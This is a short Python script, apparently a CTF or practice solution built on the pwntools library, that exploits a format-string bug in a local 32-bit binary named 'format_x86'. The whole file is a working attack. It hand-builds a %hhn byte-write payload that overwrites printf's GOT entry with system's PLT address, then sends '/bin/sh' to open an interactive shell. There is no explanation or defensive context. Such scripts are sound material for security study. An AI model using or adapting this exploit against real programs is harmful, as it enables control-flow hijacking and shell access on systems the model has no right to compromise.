#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
p = process('./format_x86')
elf = ELF('./format_x86')
offset = 5
printf_got = elf.got['printf'] # 0x08049778
system_plt = elf.plt['system'] # 0x08048320

def fmt(offset, addr, val):
	payload = ''.join(p32(addr + i) for i in range(4))
	printed = len(payload)
	fmt1 = '%{}c'
	fmt2 = '%{}$hhn'
	for i in range(4):
		byte = (val >> (i * 8)) & 0xff
		addition = (byte - printed + 256) % 256
		if addition > 0:
			payload += fmt1.format(str(addition))
		payload += fmt2.format(str(offset + i))
		printed += addition
	return payload

payload = fmt(offset, printf_got, system_plt)
# payload = fmtstr_payload(5, {printf_got:system_plt})
p.sendline(payload)
p.recv()
p.sendline('/bin/sh\x00')
p.interactive()
